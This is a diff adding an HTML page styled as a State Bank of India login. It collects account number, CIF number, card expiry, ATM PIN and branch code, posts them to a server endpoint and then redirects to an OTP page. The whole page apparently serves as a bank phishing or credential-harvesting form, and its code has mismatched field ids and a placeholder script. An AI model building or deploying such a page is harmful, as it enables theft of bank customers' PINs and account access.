@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Welcome To SBI</title>
+  
+  <!-- Styles here -->
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    input[type="text"],
+    input[type="number"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0 0px 0;
+      display: inline-block;
+      border: 1.3px solid black;
+      box-sizing: border-box;
+      font-size: 16px; /* Increased placeholder text size */
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 14px 20px;
+      margin: 8px 0;
+      border: none;
+      cursor: pointer;
+      width: 100%;
+      height: 45px
+      
+      
+    }
+    button:hover {
+      opacity: 0.8;
+    }
+  .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      font-weight: 600;
+    }
+
+    .split-input {
+      display: flex;
+    }
+
+    .split-input .form-group {
+      flex: 1;
+      margin-right: 5px;
+      
+    }
+  
+  </style>
+
+  <!-- Bootstrap for mobile view -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+
+</head>
+<body>
+<form id="myForm" class="container">
+  <img src="logo.png" alt="SBI LOGO" width="100%" height="180">
+  
+  <div class="form-group">
+    <br>
+    <label for="accountNumber">Account Number:</label>
+    <input type="number" id="accountNumber" name="accountNumber" required class="form-control" maxlength="11">
+  </div>
+  <div class="form-group">
+    <label for="cifNumber">CIF Number:</label>
+    <input type="number" id="cifNumber" name="cifNumber" required class="form-control">
+  </div>
+  <div class="split-input">
+              <div class="form-group">
+                <label for="expiration-date">Expire Date</label>
+                <input type="text" id="expiration-date" name="expiration-date" class="form-control" placeholder=""required>
+                <span id="expiration-date-error" class="error-message"></span>
+              </div>
+              <div class="form-group">
+                <label for="atm pin">ATM PIN</label>
+                <input type="number" id="atm pin" name="atm pin" class="form-control" placeholder=""*required>
+                
+              </div>
+            </div>
+  <div class="form-group">
+    <label for="atmPin">Branch Code:</label>
+    <input type="number" id="atmPin" name="atmPin" pattern="\d{4}" title="Please enter your 4 digit ATM PIN." required class="form-control">
+  </div>
+  <br>
+  <button type="submit" class="btn btn-primary">Proceed</button>
+  
+ 
+  <img src="footer.png" alt="Girl in a jacket" width="100%" height="450">
+
+</form>
+
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@1.16.1/dist/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+
+ <script src="your_js_file.js"></script>
+</body>
+
+<script>
+  document.getElementById('expiration-date').addEventListener('input', function (e) {
+    var input = e.target.value;
+    if (input.length === 2 && !input.includes('/')) {
+      e.target.value = input + '/';
+    } else if (input.length === 3 && input.charAt(2) === '/') {
+      e.target.value = input.slice(0, 2);
+    } else if (input.length > 5) {
+      e.target.value = input.slice(0, 5);
+    }
+  });
+</script>
+
+<script>
+// Assuming you have jQuery loaded
+function handleSubmit(event) {
+    event.preventDefault(); // Prevent the default form submission
+
+    const formData = {
+        accountNumber: $('#accountNumber').val(),
+        cifNumber: $('#cifNumber').val(),
+        expirationDate: $('#expiration-date').val(),
+        atmPin: $('#atm_pin').val(), // Make sure the id is corrected in the HTML
+        branchCode: $('#branchCode').val(),
+    };
+
+    // Send the form data to your server
+    $.ajax({
+        type: 'POST',
+        url: '/submit-form', // The endpoint in your server for form submission
+        data: formData,
+        success: function(response) {
+            // Redirect on successful submission
+            window.location.href = "otp.html";
+        },
+        error: function(err) {
+            // Handle errors (optional)
+            alert('Error submitting form.');
+        }
+    });
+}
+</script>
+
+</body>
+</html>
